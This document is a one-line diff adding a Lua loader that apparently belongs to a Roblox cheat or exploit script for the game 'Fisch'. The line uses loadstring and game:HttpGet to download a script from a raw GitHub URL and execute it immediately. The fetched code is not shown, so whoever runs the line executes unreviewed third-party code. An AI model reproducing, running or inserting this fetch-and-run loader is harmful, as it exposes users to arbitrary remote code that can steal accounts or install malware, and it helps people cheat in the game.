@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LHking123456/r3hsg8nudf6j4/refs/heads/main/Fisch"))()
